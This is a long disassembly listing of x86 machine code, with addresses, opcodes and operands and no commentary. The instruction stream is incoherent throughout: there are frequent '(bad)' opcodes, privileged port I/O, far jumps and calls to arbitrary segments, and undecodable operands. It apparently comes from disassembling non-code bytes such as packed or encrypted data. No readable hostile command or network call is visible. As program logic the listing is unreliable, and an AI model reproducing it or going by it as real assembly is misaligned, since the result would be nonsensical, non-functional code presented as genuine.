  41b10d:	pushf  
  41b10e:	in     al,dx
  41b10f:	test   DWORD PTR [edx],esp
  41b111:	scas   al,BYTE PTR es:[edi]
  41b112:	imul   BYTE PTR [edx]
  41b114:	and    al,0x23
  41b116:	shl    DWORD PTR [ebx-0x685988da],1
  41b11c:	scas   eax,DWORD PTR es:[edi]
  41b11d:	ins    DWORD PTR es:[edi],dx
  41b11e:	sub    eax,DWORD PTR [edx-0x76]
  41b121:	and    esi,DWORD PTR [ecx-0x58286537]
  41b127:	xchg   esp,eax
  41b128:	dec    eax
  41b129:	repnz stc 
  41b12b:	xor    eax,0x69dee2c6
  41b130:	mov    ds:0xb880f2ea,al
  41b135:	jne    0x41b195
  41b137:	(bad)  
  41b138:	xor    BYTE PTR [eax-0x25b44c26],ch
  41b13e:	clc    
  41b13f:	push   es
  41b140:	xor    al,0x7c
  41b142:	add    al,0xe2
  41b144:	jl     0x41b11f
  41b146:	add    bh,al
  41b148:	lock mov eax,ds:0xd1b7f2f2
  41b14e:	pop    ecx
  41b14f:	nop
  41b150:	adc    ebp,DWORD PTR [ebx+0x1c]
  41b153:	xchg   esi,eax
  41b154:	push   edx
  41b155:	imul   edx,DWORD PTR [edx+0x4],0xfffffff2
  41b159:	gs mov esi,0x48e2edd0
  41b15f:	xchg   esp,eax
  41b160:	popf   
  41b161:	sahf   
  41b162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b163:	inc    edi
  41b164:	xchg   ecx,eax
  41b165:	hlt    
  41b166:	and    ebp,DWORD PTR [ebp+0x4ca4ac51]
  41b16c:	fwait
  41b16d:	mov    ebp,0x35c6a653
  41b172:	pusha  
  41b173:	enter  0xfa61,0x83
  41b177:	dec    edi
  41b178:	mov    bl,0x46
  41b17a:	rcl    cl,cl
  41b17c:	in     eax,dx
  41b17d:	int3   
  41b17e:	sbb    bl,dh
  41b180:	int3   
  41b181:	adc    BYTE PTR [edx+0x758e5485],bl
  41b187:	sahf   
  41b188:	test   DWORD PTR [ebx*2+0x30811ed8],0xa322cc87
  41b193:	int3   
  41b194:	dec    esp
  41b195:	test   eax,0x68ae8614
  41b19a:	out    0xa,al
  41b19c:	push   0xffffff94
  41b19e:	mov    edi,0x3a75dc2a
  41b1a3:	sub    ebp,DWORD PTR [edi]
  41b1a5:	loope  0x41b19e
  41b1a7:	mov    ?,WORD PTR [esp+eax*4+0x4e]
  41b1ab:	or     BYTE PTR [edi+0x3d9cbc5c],0x1e
  41b1b2:	push   cs
  41b1b3:	loopne 0x41b221
  41b1b5:	sahf   
  41b1b6:	dec    esi
  41b1b7:	psllq  mm0,mm3
  41b1ba:	cmp    DWORD PTR [ebx],ebp
  41b1bc:	cld    
  41b1bd:	jge    0x41b1ae
  41b1bf:	mov    ebp,0xb619a031
  41b1c4:	mov    ds:0xe7ce6c91,eax
  41b1c9:	sbb    ebx,esi
  41b1cb:	ds cmp al,0xc5
  41b1ce:	jo     0x41b197
  41b1d0:	adc    eax,0xf753d383
  41b1d5:	jg     0x41b1f4
  41b1d7:	bound  esp,QWORD PTR [ebx-0x2e]
  41b1da:	mov    edi,?
  41b1dc:	fcomp  DWORD PTR [ebx]
  41b1de:	scas   eax,DWORD PTR es:[edi]
  41b1df:	sbb    DWORD PTR [eax],eax
  41b1e1:	mov    edx,0x55e7c3eb
  41b1e6:	jle    0x41b1ed
  41b1e8:	scas   al,BYTE PTR es:[edi]
  41b1e9:	pop    ebp
  41b1ea:	data16 fsubr QWORD PTR [edx+ecx*8+0x44b9adbd]
  41b1f2:	cmp    dh,BYTE PTR [esi]
  41b1f4:	ss gs push edi
  41b1f7:	je     0x41b1e9
  41b1f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1fa:	mov    ch,0x4a
  41b1fc:	mov    bl,0x8c
  41b1fe:	jb     0x41b20c
  41b200:	sub    BYTE PTR [ebp-0x43],ch
  41b203:	pop    eax
  41b204:	push   edx
  41b205:	pop    esp
  41b206:	cmp    BYTE PTR [eax],ch
  41b208:	out    0xff,eax
  41b20a:	repz xor edi,edx
  41b20d:	pop    ss
  41b20e:	inc    ebx
  41b20f:	push   ds
  41b210:	mov    cs,WORD PTR [edi+0x66]
  41b213:	rcr    BYTE PTR fs:[eax-0x3a839276],cl
  41b21a:	adc    al,0xf6
  41b21c:	cmc    
  41b21d:	ss ret 
  41b21f:	push   cs
  41b220:	ror    DWORD PTR [esi-0x5d],cl
  41b223:	shr    DWORD PTR [ebp-0x55],0xb5
  41b227:	inc    edi
  41b228:	xlat   BYTE PTR ds:[ebx]
  41b229:	ds mov esp,0xff857ab8
  41b22f:	jmp    0x9266c72c
  41b234:	cdq    
  41b235:	shr    DWORD PTR [ebp-0x7fd70a76],cl
  41b23b:	mov    esp,0x9f61bc34
  41b240:	inc    edi
  41b241:	mov    BYTE PTR [edx+esi*4+0x6626085a],al
  41b248:	das    
  41b249:	mov    cl,BYTE PTR [eax+0x1d]
  41b24c:	xchg   esi,eax
  41b24d:	inc    edi
  41b24e:	lea    esi,[ecx]
  41b250:	les    esp,FWORD PTR [edx]
  41b252:	mov    esi,0x3b8b21d
  41b257:	sbb    BYTE PTR [esi-0x2a17a45a],dh
  41b25d:	or     ah,dh
  41b25f:	scas   eax,DWORD PTR es:[edi]
  41b260:	sub    DWORD PTR [esp+ecx*2],0x19
  41b264:	jae    0x41b2db
  41b266:	push   esi
  41b267:	cmp    al,0xba
  41b269:	mov    bl,0x6b
  41b26b:	rcr    BYTE PTR [eax+0xe],0x7b
  41b26f:	imul   ecx,DWORD PTR [edx],0x7c0c7c23
  41b275:	pop    eax
  41b276:	hlt    
  41b277:	out    dx,eax
  41b278:	push   DWORD PTR [ecx]
  41b27a:	mov    ch,0x3b
  41b27c:	popa   
  41b27d:	xadd   DWORD PTR [ebx],edx
  41b280:	popf   
  41b281:	mov    ds:0xafa63a1b,al
  41b286:	neg    BYTE PTR [ebx]
  41b288:	sub    BYTE PTR [esp+edx*8],ch
  41b28b:	cmp    ebx,DWORD PTR [esp+esi*1]
  41b28e:	sar    DWORD PTR [ebp+0x1a],1
  41b291:	xor    al,0x34
  41b293:	std    
  41b294:	mov    cl,0xeb
  41b296:	add    BYTE PTR [ebp+0x2f],0xc4
  41b29a:	add    DWORD PTR [eax+eiz*1],0x1b
  41b29e:	jbe    0x41b28a
  41b2a0:	mov    edx,0x249071d6
  41b2a5:	ds in  al,0x9e
  41b2a8:	inc    ebx
  41b2a9:	test   ecx,esp
  41b2ab:	inc    edi
  41b2ac:	loop   0x41b30b
  41b2ae:	mov    esi,0xbd6fa997
  41b2b3:	pop    edi
  41b2b4:	clc    
  41b2b5:	and    edx,ecx
  41b2b7:	test   eax,0x558b3117
  41b2bc:	cmp    al,0x83
  41b2be:	arpl   WORD PTR [edi],bx
  41b2c0:	jae    0x41b332
  41b2c2:	jmp    0x451f:0xa9e8a3b6
  41b2c9:	xchg   DWORD PTR [eax+edx*2],ecx
  41b2cc:	icebp  
  41b2cd:	sub    bh,bl
  41b2cf:	dec    edi
  41b2d0:	xchg   DWORD PTR [edi+0x58],eax
  41b2d3:	arpl   WORD PTR [eax+ebx*2],di
  41b2d6:	push   esp
  41b2d7:	cmp    DWORD PTR [eax],esp
  41b2d9:	sub    BYTE PTR [ecx-0x52fa483f],dh
  41b2df:	fidivr WORD PTR cs:[edx+0x69]
  41b2e3:	dec    eax
  41b2e4:	add    edx,DWORD PTR [ecx+0x25]
  41b2e7:	pop    esp
  41b2e8:	jne    0x41b2e3
  41b2ea:	ds cld 
  41b2ec:	bound  edx,QWORD PTR [edi+0x2dd77866]
  41b2f2:	int3   
  41b2f3:	mov    cl,0x6f
  41b2f5:	or     al,bh
  41b2f7:	mov    al,ds:0x296f41af
  41b2fc:	out    dx,eax
  41b2fd:	or     ch,dh
  41b2ff:	fdiv   QWORD PTR [ecx+edx*2]
  41b302:	call   0xf078f7d8
  41b307:	and    al,BYTE PTR [edx]
  41b309:	gs sub al,0xae
  41b30c:	sahf   
  41b30d:	dec    ebp
  41b30e:	jmp    0x40be:0x23ac36ab
  41b315:	sub    ebp,ebx
  41b317:	and    al,0x45
  41b319:	mov    cl,0x8e
  41b31b:	xchg   ebx,eax
  41b31c:	sub    al,0xd1
  41b31e:	pop    ds
  41b31f:	pop    edi
  41b320:	ret    0xb23a
  41b323:	lods   al,BYTE PTR ds:[esi]
  41b324:	sub    eax,DWORD PTR [esi]
  41b326:	or     ebp,DWORD PTR [edx-0x43]
  41b329:	xor    BYTE PTR [ecx-0x6684272c],dh
  41b32f:	stc    
  41b330:	push   cs
  41b331:	lods   eax,DWORD PTR ds:[esi]
  41b332:	mov    dh,0x85
  41b334:	xlat   BYTE PTR ds:[ebx]
  41b335:	jb     0x41b3a9
  41b337:	pop    ebp
  41b338:	iret   
  41b339:	cmp    edx,DWORD PTR [edi+eiz*2]
  41b33c:	inc    eax
  41b33d:	pop    ecx
  41b33e:	loop   0x41b2d6
  41b340:	in     eax,dx
  41b341:	sub    DWORD PTR [edi+0x24],ebx
  41b344:	idiv   DWORD PTR [ebx+0x5f2244f0]
  41b34a:	pop    esp
  41b34b:	loop   0x41b31d
  41b34d:	push   edx
  41b34f:	push   ecx
  41b350:	out    0x12,al
  41b352:	enter  0x1ba0,0x34
  41b356:	fwait
  41b357:	mov    edx,0x78a55c9
  41b35c:	adc    eax,0x616b58d0
  41b361:	or     BYTE PTR [edx],ah
  41b363:	lahf   
  41b364:	and    DWORD PTR [edi-0x79],esi
  41b367:	cld    
  41b368:	stos   DWORD PTR es:[edi],eax
  41b369:	cmp    al,0x47
  41b36b:	dec    ebp
  41b36c:	cmp    bl,dh
  41b36e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b36f:	jl     0x41b2f6
  41b371:	stc    
  41b372:	imul   edi,ebp,0x91edbee5
  41b378:	cmp    al,0xce
  41b37a:	enter  0xb390,0xfb
  41b37e:	js     0x41b3ff
  41b380:	div    cl
  41b382:	xchg   edi,eax
  41b383:	retf   0xa307
  41b386:	call   0xaef5:0xf7cd7fea
  41b38d:	int3   
  41b38e:	test   BYTE PTR [eax-0x2],bl
  41b391:	or     al,dl
  41b393:	ds clc 
  41b395:	and    edi,DWORD PTR [esi]
  41b397:	sub    cl,0x9e
  41b39a:	push   edi
  41b39b:	fsubr  QWORD PTR ds:0x5fc3a308
  41b3a1:	data16 jo 0x41b41c
  41b3a4:	fst    QWORD PTR [edx+eax*8]
  41b3a7:	je     0x41b3c3
  41b3a9:	dec    ebp
  41b3aa:	(bad)  
  41b3ab:	je     0x41b3c8
  41b3ad:	out    0x71,eax
  41b3af:	fild   QWORD PTR [edx]
  41b3b1:	sbb    BYTE PTR [ebx+eiz*4-0x67],dh
  41b3b5:	jge    0x41b33b
  41b3b7:	test   dh,bl
  41b3b9:	or     edx,esi
  41b3bb:	or     edi,DWORD PTR [edx]
  41b3bd:	pushf  
  41b3be:	mov    eax,ds:0xaff95be7
  41b3c3:	rol    BYTE PTR [edx+0x63681c3],1
  41b3c9:	xor    eax,0x3a9c4c8
  41b3ce:	jbe    0x41b36c
  41b3d0:	dec    ebp
  41b3d1:	sbb    BYTE PTR [edx-0x2da10b3b],cl
  41b3d7:	lods   eax,DWORD PTR ds:[esi]
  41b3d8:	add    ecx,esp
  41b3da:	ins    BYTE PTR es:[edi],dx
  41b3db:	inc    edi
  41b3dc:	push   ds
  41b3dd:	jnp    0x41b3b6
  41b3df:	test   al,0xe0
  41b3e1:	test   DWORD PTR [edx],esp
  41b3e3:	cmp    ch,0x3e
  41b3e6:	sahf   
  41b3e7:	sub    al,BYTE PTR [eax]
  41b3e9:	addr16 xor ecx,edx
  41b3ec:	mov    dh,0xae
  41b3ee:	push   0xffffffc2
  41b3f0:	ja     0x41b3e2
  41b3f2:	(bad)  
  41b3f3:	in     al,dx
  41b3f4:	cmp    esp,edx
  41b3f6:	mov    edx,0x94eac912
  41b3fb:	jle    0x41b3f6
  41b3fd:	imul   esp,DWORD PTR ds:0xf1910931,0xffffffd2
  41b404:	dec    ecx
  41b405:	cmp    al,0xeb
  41b407:	enter  0xea30,0xc6
  41b40b:	push   0x36
  41b40d:	xor    DWORD PTR [edi+0x69],esi
  41b410:	cmp    edx,DWORD PTR [edx+edi*1]
  41b413:	enter  0x912c,0xb7
  41b417:	jge    0x41b39d
  41b419:	adc    BYTE PTR [eax+0x716d149c],dl
  41b41f:	ret    
  41b420:	push   ebp
  41b421:	rcr    DWORD PTR [edi+0x13],cl
  41b424:	dec    ebp
  41b425:	and    al,0xf4
  41b427:	inc    edx
  41b428:	adc    ecx,DWORD PTR [esi-0x45]
  41b42b:	cmp    dl,BYTE PTR [esi-0x185d394d]
  41b431:	sub    BYTE PTR [edx+eax*1-0x73c945d6],ah
  41b438:	lods   eax,DWORD PTR ds:[esi]
  41b439:	inc    ebx
  41b43a:	xor    DWORD PTR [edi+0x6b592221],edi
  41b440:	lock cmp cl,BYTE PTR [eax]
  41b443:	in     eax,dx
  41b444:	mov    BYTE PTR [edi],al
  41b446:	or     eax,0x4600ff75
  41b44b:	outs   dx,BYTE PTR ds:[esi]
  41b44c:	push   edi
  41b44d:	jle    0x41b4c8
  41b44f:	sbb    al,0xaa
  41b451:	push   0xd9314fc8
  41b456:	int3   
  41b457:	test   ah,dl
  41b459:	xchg   esp,eax
  41b45a:	std    
  41b45b:	outs   dx,DWORD PTR ds:[esi]
  41b45c:	mov    dl,0x5f
  41b45e:	or     edx,DWORD PTR [ebx]
  41b460:	jns    0x41b434
  41b462:	popa   
  41b463:	js     0x41b3f2
  41b465:	xchg   BYTE PTR [ebp-0x32],bl
  41b468:	and    DWORD PTR [edi+0x46],ecx
  41b46b:	in     al,0xc6
  41b46d:	and    dh,BYTE PTR [eax-0x4a]
  41b470:	fs push esi
  41b472:	call   FWORD PTR [edx+0x2a]
  41b475:	mov    DWORD PTR [edi+0x64cb9509],edi
  41b47b:	cs loopne 0x41b4b5
  41b47e:	fcomp  QWORD PTR [esp+esi*4+0x45ba25c5]
  41b485:	adc    al,0x93
  41b487:	and    al,dh
  41b489:	mov    BYTE PTR [ebx],cl
  41b48b:	push   cs
  41b48c:	es sti 
  41b48e:	(bad)  
  41b490:	push   ecx
  41b491:	jl     0x41b439
  41b493:	adc    al,0x89
  41b495:	jmp    0x845d:0xbf2aeda1
  41b49c:	ficom  WORD PTR [ecx-0x464881bf]
  41b4a2:	jno    0x41b4f9
  41b4a4:	nop
  41b4a5:	loop   0x41b46b
  41b4a7:	lods   eax,DWORD PTR ds:[esi]
  41b4a8:	inc    esp
  41b4a9:	pop    edi
  41b4aa:	daa    
  41b4ab:	out    0x88,eax
  41b4ad:	dec    esp
  41b4ae:	das    
  41b4af:	dec    esp
  41b4b0:	dec    ebx
  41b4b1:	inc    edx
  41b4b2:	mov    ch,0x54
  41b4b4:	fsub   st(6),st
  41b4b6:	outs   dx,BYTE PTR ds:[esi]
  41b4b7:	sbb    BYTE PTR [eax],dl
  41b4b9:	retf   0x484a
  41b4bc:	xchg   ecx,eax
  41b4bd:	cmp    al,0x4a
  41b4bf:	test   al,0x7d
  41b4c1:	ret    
  41b4c2:	ret    
  41b4c3:	add    BYTE PTR [eax+0x77c2762f],0x35
  41b4ca:	adc    ebx,DWORD PTR [edi-0x4e]
  41b4cd:	pusha  
  41b4ce:	cmp    DWORD PTR [ebx-0x3b56e838],edi
  41b4d4:	xlat   BYTE PTR ds:[ebx]
  41b4d5:	jne    0x41b459
  41b4d7:	jb     0x41b4f9
  41b4d9:	imul   BYTE PTR [edx+0x20]
  41b4dc:	xchg   edi,eax
  41b4dd:	mov    ah,0x2e
  41b4df:	push   ss
  41b4e0:	cdq    
  41b4e1:	pop    ds
  41b4e2:	repz add eax,0xf45957ed
  41b4e8:	dec    edi
  41b4e9:	xchg   esi,esi
  41b4eb:	jns    0x41b472
  41b4ed:	inc    edi
  41b4ee:	call   0xa636ad3b
  41b4f3:	pop    esp
  41b4f4:	cli    
  41b4f5:	repnz mov WORD PTR [ecx],ss
  41b4f8:	es jno 0x41b568
  41b4fb:	(bad)  
  41b4fc:	fcomp  DWORD PTR [ecx]
  41b4fe:	and    DWORD PTR fs:[eax],ebx
  41b501:	in     al,dx
  41b502:	sub    esi,DWORD PTR [ebp+0xf]
  41b505:	mov    edi,0x158c543b
  41b50a:	scas   al,BYTE PTR es:[edi]
  41b50b:	std    
  41b50c:	scas   eax,DWORD PTR es:[edi]
  41b50d:	xor    al,0xe
  41b50f:	push   0x27
  41b511:	fisubr WORD PTR [ebp+ebp*4-0x395fafcb]
  41b518:	mov    ah,ah
  41b51a:	jbe    0x41b544
  41b51c:	inc    ecx
  41b51d:	stos   BYTE PTR es:[edi],al
  41b51e:	loope  0x41b591
  41b520:	adc    ebp,DWORD PTR [eax]
  41b522:	shl    BYTE PTR [eax-0x6bf1e2a5],0x32
  41b529:	(bad)  
  41b52a:	cmp    eax,0x7c363b71
  41b52f:	add    eax,0xc35dc277
  41b534:	adc    eax,0xb254500a
  41b539:	es push esi
  41b53b:	jle    0x41b4d0
  41b53d:	jmp    0x25e8843d
  41b542:	mov    eax,0x3dbba80d
  41b547:	test   al,0x10
  41b549:	dec    edx
  41b54a:	inc    edx
  41b54b:	cmc    
  41b54c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b54d:	stos   DWORD PTR es:[edi],eax
  41b54e:	imul   DWORD PTR [edx+eax*8+0x13718b3c]
  41b555:	sbb    dh,BYTE PTR [ebp+0x6f]
  41b558:	fcmovb st,st(4)
  41b55a:	cmp    DWORD PTR [edi],esi
  41b55c:	dec    ebp
  41b55d:	jbe    0x41b58d
  41b55f:	pusha  
  41b560:	cmp    DWORD PTR [ebx+0x70],esi
  41b563:	mov    ds:0x507ff0ed,al
  41b568:	mov    ?,WORD PTR [esi-0x36]
  41b56b:	jmp    0x41b517
  41b56d:	push   esp
  41b56e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b56f:	xchg   ecx,eax
  41b570:	adc    DWORD PTR [esi-0x75],edi
  41b573:	mov    edi,DWORD PTR [edx+0x1d4b0899]
  41b579:	repnz sti 
  41b57b:	stos   DWORD PTR es:[edi],eax
  41b57c:	mov    bl,BYTE PTR [eax]
  41b57e:	call   0xb6a9a52
  41b583:	hlt    
  41b584:	mov    ecx,0xcbb0388b
  41b589:	jo     0x41b5ad
  41b58b:	push   0xffffffd0
  41b58d:	add    eax,0x5dd7ff0
  41b592:	mov    bh,0x29
  41b594:	lds    edi,FWORD PTR [ebx+0xe9a9103]
  41b59a:	pop    edx
  41b59b:	adc    al,0x5d
  41b59d:	xchg   ecx,eax
  41b59e:	test   BYTE PTR [ecx],bh
  41b5a0:	push   ds
  41b5a1:	jg     0x41b552
  41b5a3:	and    bl,bl
  41b5a5:	inc    esp
  41b5a6:	fild   DWORD PTR [esp+ebp*2]
  41b5a9:	inc    eax
  41b5aa:	mov    ebp,0x90bc624
  41b5af:	push   0xd9a37f09
  41b5b4:	cmp    al,0xb6
  41b5b6:	popa   
  41b5b7:	call   0x649df667
  41b5bc:	push   0xffffff9e
  41b5be:	xchg   edi,eax
  41b5bf:	mov    BYTE PTR [edi],bh
  41b5c1:	sar    BYTE PTR [edi-0x2f090792],0x14
  41b5c8:	xchg   ebx,eax
  41b5c9:	das    
  41b5ca:	xor    ecx,DWORD PTR [edx]
  41b5cc:	inc    edx
  41b5cd:	dec    ecx
  41b5ce:	mov    bh,0xe0
  41b5d0:	inc    edx
  41b5d2:	xchg   edi,eax
  41b5d3:	pushf  
  41b5d4:	bound  esp,QWORD PTR [edx-0x11c5543f]
  41b5da:	ja     0x41b566
  41b5dc:	xchg   ebp,eax
  41b5dd:	mov    cl,0xe4
  41b5df:	jmp    0x86eca317
  41b5e4:	mov    dh,0x2d
  41b5e6:	stos   BYTE PTR es:[edi],al
  41b5e7:	mov    esi,0x9bd1babb
  41b5ec:	sub    BYTE PTR [ebp+ebp*8+0x58cd18f9],dl
  41b5f3:	mov    WORD PTR [edi+0x22],?
  41b5f6:	or     esi,0x20
  41b5f9:	xor    esp,DWORD PTR [esi+0x4e]
  41b5fc:	sub    ecx,edi
  41b5fe:	(bad)  
  41b5ff:	cmp    ebx,esi
  41b601:	ds std 
  41b603:	mov    dl,0x79
  41b605:	je     0x41b5b0
  41b607:	popf   
  41b608:	push   0xd
  41b60a:	and    al,0x1a
  41b60c:	idiv   DWORD PTR [ecx+0x9a8a4]
  41b612:	iret   
  41b613:	call   0xf7d4bf3c
  41b618:	dec    ecx
  41b619:	dec    esp
  41b61a:	add    ebp,edx
  41b61c:	aam    0x75
  41b61e:	jo     0x41b5a8
  41b620:	(bad)  
  41b621:	loop   0x41b62a
  41b623:	xchg   esp,eax
  41b624:	xchg   ebp,eax
  41b625:	das    
  41b626:	in     al,dx
  41b627:	xor    BYTE PTR [edx-0x6b],0xc5
  41b62b:	mov    edi,DWORD PTR [ecx+0x1917a60d]
  41b631:	xor    eax,0xd6da20c
  41b636:	aas    
  41b637:	pop    eax
  41b638:	jb     0x41b665
  41b63a:	daa    
  41b63b:	cld    
  41b63c:	xchg   ebx,eax
  41b63d:	push   es
  41b63e:	nop
  41b63f:	pop    ecx
  41b640:	pop    ds
  41b641:	jle    0x41b6c0
  41b643:	xor    DWORD PTR ds:0x711edf23,ebx
  41b649:	mov    fs:0x92775532,al
  41b64f:	jae    0x41b5fc
  41b651:	cmp    DWORD PTR [ebp-0x4b],0xffffffd4
  41b655:	adc    edi,esp
  41b657:	push   0xffffffba
  41b659:	jae    0x41b66c
  41b65b:	inc    ebx
  41b65c:	add    ch,BYTE PTR [eax+0xe]
  41b65f:	pop    ebx
  41b660:	data16 in al,dx
  41b662:	(bad)  
  41b663:	cmp    al,0x98
  41b665:	repnz dec ebx
  41b667:	mov    DWORD PTR [edi-0x59],ebx
  41b66a:	sbb    DWORD PTR [edi-0x236b5fd1],ebx
  41b670:	retf   0xce95
  41b673:	cmp    BYTE PTR [ebx+0x45],0xe3
  41b677:	das    
  41b678:	gs add esi,esi
  41b67b:	fidiv  DWORD PTR [edi]
  41b67d:	mov    eax,ds:0xae3f27cc
  41b682:	jg     0x41b614
  41b684:	sahf   
  41b685:	xor    al,0xe6
  41b687:	add    eax,0xecd332e2
  41b68c:	sets   BYTE PTR [bx+0x7314]
  41b692:	(bad)  
  41b694:	jmp    0x6f2683cf
  41b699:	adc    BYTE PTR ds:0x61fa3e82,ah
  41b69f:	pop    ecx
  41b6a0:	and    DWORD PTR [ecx],ebx
  41b6a2:	shl    BYTE PTR ds:0x57ff8e98,cl
  41b6a8:	pushf  
  41b6a9:	cmp    eax,0xb1aaff13
  41b6ae:	push   es
  41b6af:	jmp    0x47cd:0xe19f1a86
  41b6b6:	aam    0xa8
  41b6b8:	mov    esp,0x773ee9e6
  41b6bd:	test   bh,al
  41b6bf:	std    
  41b6c0:	mov    ds:0x8e513c4f,eax
  41b6c5:	cmp    eax,0x9f33ec25
  41b6ca:	xor    DWORD PTR [ebx],ebp
  41b6cc:	aam    0xd6
  41b6ce:	jmp    0xd469bd58
  41b6d3:	sbb    esp,DWORD PTR [edi-0x73f52c46]
  41b6d9:	jmp    0xa9a08a3
  41b6de:	mov    ah,0x73
  41b6e0:	int    0x55
  41b6e2:	mov    al,0xb4
  41b6e4:	dec    edi
  41b6e5:	or     esp,DWORD PTR [ecx+0x2f]
  41b6e8:	pop    eax
  41b6e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6ea:	and    eax,esi
  41b6ec:	scas   eax,DWORD PTR es:[edi]
  41b6ed:	stos   BYTE PTR es:[edi],al
  41b6ee:	and    ebx,0xce63b340
  41b6f4:	cmp    eax,0x6646f52a
  41b6f9:	inc    eax
  41b6fa:	pop    es
  41b6fb:	rol    BYTE PTR [ebp-0x21567fea],cl
  41b701:	push   cs
  41b702:	lods   al,BYTE PTR ds:[esi]
  41b703:	and    BYTE PTR [edi],bl
  41b705:	mov    ecx,0xce066da2
  41b70a:	cmc    
  41b70b:	ss test sp,0xc6ee
  41b711:	fstp   st(1)
  41b713:	dec    eax
  41b714:	push   eax
  41b715:	mov    ecx,0xacef4c5f
  41b71a:	shr    DWORD PTR [edx+0x76912830],cl
  41b720:	call   0x2e23:0x4365320a
  41b727:	cmp    al,0x9b
  41b729:	jb     0x41b74f
  41b72b:	cmp    eax,0xcde896d9
  41b730:	jl     0x41b6cf
  41b732:	fsub   st(0),st
  41b734:	(bad)
  41b737:	test   eax,ebp
  41b739:	push   0x49c8e08a
  41b73e:	or     ebp,DWORD PTR [esp+ebp*8]
  41b741:	jecxz  0x41b74a
  41b743:	xor    DWORD PTR [ebx-0x240b8e8b],edx
  41b749:	data16 loopne 0x41b754
  41b74c:	imul   edx,DWORD PTR [esi+0x6c],0xffffff82
  41b750:	daa    
  41b751:	inc    ecx
  41b752:	ins    DWORD PTR es:[edi],dx
  41b753:	(bad)
  41b757:	repnz inc ecx
  41b759:	aad    0x3e
  41b75b:	or     ebx,DWORD PTR [esi-0x25]
  41b75e:	and    edx,ecx
  41b760:	test   eax,0x7230d633
  41b765:	daa    
  41b766:	sbb    DWORD PTR [ebp+0x5],edx
  41b769:	sub    BYTE PTR [ecx-0x25],bh
  41b76c:	in     eax,dx
  41b76d:	daa    
  41b76e:	xchg   esp,eax
  41b76f:	jb     0x41b72d
  41b771:	jg     0x41b765
  41b773:	mov    eax,ds:0x7f990677
  41b778:	xchg   ecx,eax
  41b779:	pusha  
  41b77a:	nop
  41b77b:	(bad)  
  41b77c:	sti    
  41b77d:	mov    ds:0x92c12308,eax
  41b782:	pop    esp
  41b783:	inc    esi
  41b784:	and    edi,DWORD PTR ds:0xafe6d9c6
  41b78a:	mov    al,ds:0xdc2ca5d6
  41b78f:	sub    ch,dl
  41b791:	outs   dx,BYTE PTR ds:[esi]
  41b792:	push   edi
  41b793:	or     al,0xe9
  41b795:	leave  
  41b796:	test   eax,0x4931ca75
  41b79b:	jge    0x41b77e
  41b79d:	push   ds
  41b79e:	mov    ds:0xddac54db,eax
  41b7a3:	in     eax,0x5f
  41b7a5:	sub    al,0x49
  41b7a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7a8:	test   eax,0x33593d14
  41b7ad:	mov    dl,0xd0
  41b7af:	aaa    
  41b7b0:	xor    dh,BYTE PTR [esi+0x42]
  41b7b3:	adc    esi,DWORD PTR [eax]
  41b7b5:	pop    ss
  41b7b6:	lods   al,BYTE PTR ds:[esi]
  41b7b7:	push   cs
  41b7b8:	and    edx,DWORD PTR [eax]
  41b7ba:	push   ebp
  41b7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7bc:	and    eax,0x70211438
  41b7c1:	pusha  
  41b7c2:	loop   0x41b83a
  41b7c4:	imul   eax,DWORD PTR [edi-0x2703893b],0x1a
  41b7cb:	(bad)  [esi]
  41b7cd:	or     dh,ah
  41b7cf:	mov    ?,eax
  41b7d1:	jne    0x41b7ba
  41b7d3:	xor    eax,0x1948d02e
  41b7d8:	pop    esi
  41b7d9:	imul   esi,DWORD PTR [eax+0x6d],0xc378b75a
  41b7e0:	cld    
  41b7e1:	stc    
  41b7e2:	test   al,0x5c
  41b7e4:	int    0x36
  41b7e6:	mov    eax,0x6b9e3f26
  41b7eb:	mov    ebp,0xe9e3dca1
  41b7f0:	seto   BYTE PTR [ecx]
  41b7f3:	ja     0x41b784
  41b7f5:	xor    dh,cl
  41b7f7:	jp     0x41b7bd
  41b7f9:	outs   dx,BYTE PTR ds:[esi]
  41b7fa:	xor    ecx,ebx
  41b7fc:	loopne 0x41b849
  41b7fe:	loope  0x41b863
  41b800:	bound  ebx,QWORD PTR [eax]
  41b802:	enter  0xdd4e,0xc3
  41b806:	push   ebp
  41b807:	cmp    BYTE PTR [ebx+0x70],bl
  41b80a:	push   ss
  41b80b:	mov    eax,DWORD PTR ds:0x67962b97
  41b811:	out    0xd4,eax
  41b813:	fistp  DWORD PTR [ebp-0x30]
  41b816:	adc    DWORD PTR fs:[ebx-0x69],edx
  41b81a:	sub    eax,ebp
  41b81c:	ret    
  41b81d:	push   es
  41b81e:	retf   
  41b81f:	add    DWORD PTR [ebp+0x50ff8b71],0x6e
  41b826:	add    eax,0x83f2ffda
  41b82b:	mov    al,0x7d
  41b82d:	pop    ds
  41b82e:	xchg   edx,eax
  41b82f:	popf   
  41b830:	imul   edi,DWORD PTR [eax],0xf2140135
  41b836:	fcomp  st(6)
  41b838:	xor    bl,bh
  41b83a:	outs   dx,BYTE PTR ds:[esi]
  41b83b:	or     dl,ch
  41b83d:	jmp    0x477f:0x4bc6b203
  41b844:	(bad)  
  41b845:	inc    ecx
  41b846:	cmp    BYTE PTR [eax-0x32],0x59
  41b84a:	adc    DWORD PTR [edx],ecx
  41b84c:	test   al,0x72
  41b84e:	xor    ebx,ecx
  41b850:	ss popf 
  41b852:	sub    ah,BYTE PTR [esi+edx*1+0x23]
  41b856:	fimul  WORD PTR [ebp-0x2a]
  41b859:	retf   
  41b85a:	jecxz  0x41b7e3
  41b85c:	sbb    dh,BYTE PTR [ebx-0x79]
  41b85f:	jns    0x41b891
  41b861:	inc    eax
  41b862:	push   cs
  41b863:	jbe    0x41b7ff
  41b865:	cli    
  41b866:	mov    eax,ds:0xd2f5a53f
  41b86b:	jo     0x41b86a
  41b86d:	fistp  QWORD PTR [ebx+ebx*8+0x68c3356e]
  41b874:	enter  0xbf6b,0x7c
  41b878:	mov    ebp,edi
  41b87a:	arpl   WORD PTR [edx+0x4ade2a15],si
  41b880:	lahf   
  41b881:	gs xor al,0xf
  41b884:	loopne 0x41b8a3
  41b886:	or     eax,0xf049234f
  41b88b:	mov    ebx,0x22353233
